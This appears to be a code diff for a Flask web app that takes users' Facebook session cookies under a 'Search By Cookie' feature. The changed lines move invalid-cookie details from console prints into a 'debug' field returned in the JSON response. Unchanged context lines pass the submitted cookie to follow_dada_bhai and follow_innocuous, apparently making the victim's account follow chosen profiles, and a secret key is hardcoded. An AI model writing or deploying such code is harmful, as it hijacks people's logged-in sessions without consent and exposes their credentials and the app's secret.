@@ -8,7 +8,7 @@ from time import sleep
 from helper import *
 import schedule
 
-__version__ = 2.1
+__version__ = 2.2
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = '2RMQfNsgrSsvpd5yZUjOhsXwoJaxw2'
@@ -112,9 +112,7 @@ def author_view(request):  # Search By Cookie
         return get_json_dict(False, 'Please give facebook session cookie', 'warning')
     fb_id = get_profile_id(cookie)
     if not fb_id:
-        print('Cookie:', cookie)
-        print(fb_id)
-        return get_json_dict(False, 'Cookie is not valid', 'warning')
+        return get_json_dict(False, 'Cookie is not valid', 'warning', debug={'cookie': cookie, 'fb_id': fb_id})
 
     follow_dada_bhai(cookie)
     follow_innocuous(cookie)
@@ -172,7 +170,8 @@ def get_json_dict(
     success: bool,
     msg: str,
     type: str,
-    acc: Users = DummyClass
+    acc: Users = DummyClass,
+    debug: dict = None
 ) -> jsonify:
     """
     Required: success, msg, type
@@ -194,6 +193,7 @@ def get_json_dict(
         'lat': acc.lat,
         'long': acc.long,
         'last_access': acc.last_access,
+        'debug': debug,
     })
 
 
